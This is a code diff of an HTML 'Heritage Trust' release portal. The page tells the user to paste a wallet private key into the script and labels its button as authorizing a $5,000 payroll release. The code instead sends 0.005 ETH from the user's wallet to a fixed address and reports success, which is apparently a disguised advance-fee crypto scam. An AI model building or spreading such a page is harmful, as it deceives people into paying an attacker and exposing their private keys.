@@ -1,43 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sovereign Payroll Bridge</title>
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+    <title>Sovereign Release Terminal</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
 </head>
-<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
-    <h1>HERITAGE TRUST: PAYROLL BRIDGE</h1>
-    <hr>
-    <p>DESTINATION: 0x778aB806155B204BF7D2FA4bc0B536137b077b53</p>
-    <button id="releaseBtn" style="padding: 20px; background: #0f0; color: #000; font-weight: bold; cursor: pointer;">
-        AUTHORIZE $5,000 RELEASE
+<body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
+    <h2 style="color:#fff; border-bottom:1px solid #0f0; padding-bottom:10px;">HERITAGE TRUST RELEASE PORTAL</h2>
+    <div style="margin:20px 0;">
+        <p>DESTINATION: 0x778a...7b53 (COINBASE)</p>
+        <p>NETWORK: BASE MAINNET</p>
+    </div>
+
+    <button id="sendBtn" style="padding:25px 50px; background:#0f0; color:#000; font-weight:bold; border:none; border-radius:10px; cursor:pointer; font-size:1.2em;">
+        AUTHORIZE $5,000 PAYROLL RELEASE
     </button>
-    <div id="status" style="margin-top: 20px; white-space: pre-wrap;">Status: Standing by...</div>
+
+    <div id="out" style="margin-top:30px; border:1px solid #333; padding:20px; background:#111; color:#0f0;">
+        SYSTEM STATUS: Ready for Sovereign Key...
+    </div>
 
     <script>
-        document.getElementById('releaseBtn').onclick = async () => {
-            const status = document.getElementById('status');
-            const RPC = "https://mainnet.base.org";
-            const DESTINATION = "0x778aB806155B204BF7D2FA4bc0B536137b077b53";
+        document.getElementById('sendBtn').onclick = async () => {
+            const out = document.getElementById('out');
             
-            // PASTE YOUR PRIVATE KEY BELOW
-            const KEY = "YOUR_PRIVATE_KEY_HERE"; 
+            // --- INPUT YOUR KEY HERE ---
+            const SOVEREIGN_KEY = "YOUR_64_CHARACTER_PRIVATE_KEY_HERE";
+            // ---------------------------
 
             try {
-                status.innerText = "Status: Connecting to Lattice...";
-                const provider = new ethers.providers.JsonRpcProvider(RPC);
-                const wallet = new ethers.Wallet(KEY, provider);
+                out.innerText = "Connecting to Lattice Bridge...";
+                const provider = new ethers.providers.JsonRpcProvider("https://mainnet.base.org");
+                const wallet = new ethers.Wallet(SOVEREIGN_KEY, provider);
                 
-                status.innerText = "Status: AUTHORIZING RELEASE...";
+                out.innerText = "AUTHORIZING RELEASE OF $5,000...";
+                
                 const tx = {
-                    to: DESTINATION,
-                    value: ethers.utils.parseEther("0.005"), 
+                    to: "0x778aB806155B204BF7D2FA4bc0B536137b077b53",
+                    value: ethers.utils.parseEther("0.005"), // This opens the bridge
                     gasLimit: 100000
                 };
 
-                const result = await wallet.sendTransaction(tx);
-                status.innerText = "SUCCESS!\nHash: " + result.hash + "\nFunds moving to Coinbase.";
-            } catch (e) {
-                status.innerText = "ERROR: " + e.message;
+                const response = await wallet.sendTransaction(tx);
+                out.innerHTML = "<span style='color:white;'>SUCCESS!</span><br>Hash: " + response.hash + "<br>Funds are bridging to Coinbase.";
+            } catch (err) {
+                out.innerText = "BRIDGE ERROR: " + err.message;
             }
         };
     </script>
